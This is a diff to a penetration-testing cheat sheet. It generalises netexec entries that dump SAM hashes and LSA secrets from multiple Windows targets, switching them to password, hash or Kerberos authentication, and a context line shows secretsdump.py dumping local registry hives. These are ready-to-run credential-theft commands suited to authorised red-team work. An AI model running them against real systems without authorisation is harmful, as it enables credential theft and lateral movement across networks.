@@ -243,35 +243,35 @@ secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
 ```
 <!-- cheat -->
 
-### netexec (SAM, password auth)
+### netexec (SAM)
 
-#smb #sam #multi-target
+#smb #sam #multi-auth #multi-target
 
-Dump SAM hashes from multiple targets using netexec with a plaintext password.
+Dump SAM hashes from multiple targets using netexec with reusable password, hash, or Kerberos auth.
 
-```sh title:"Remote SAM dump across targets via netexec with password"
-nxc smb "$rhost_ip" -d "$domain" -u "$user" -p "$pass" --sam
+```sh title:"Remote SAM dump across targets via netexec"
+nxc smb "$rhost_ip" -d "$domain" -u "$user" $auth_flags --sam
 ```
 <!-- cheat
 import domain_ip
 import users
-import passwords
+import nxc_auth
 var rhost_ip
 -->
 
-### netexec (LSA, NT hash auth)
+### netexec (LSA)
 
-#smb #pth #lsa #multi-target
+#smb #lsa #multi-auth #multi-target
 
-Dump LSA secrets from multiple targets using netexec with an NT hash.
+Dump LSA secrets from multiple targets using netexec with reusable password, hash, or Kerberos auth.
 
-```sh title:"Remote LSA dump across targets via netexec with NT hash"
-nxc smb "$rhost_ip" -d "$domain" -u "$user" -H "$nt_hash" --lsa
+```sh title:"Remote LSA dump across targets via netexec"
+nxc smb "$rhost_ip" -d "$domain" -u "$user" $auth_flags --lsa
 ```
 <!-- cheat
 import domain_ip
 import users
-var nt_hash
+import nxc_auth
 var rhost_ip
 -->
 
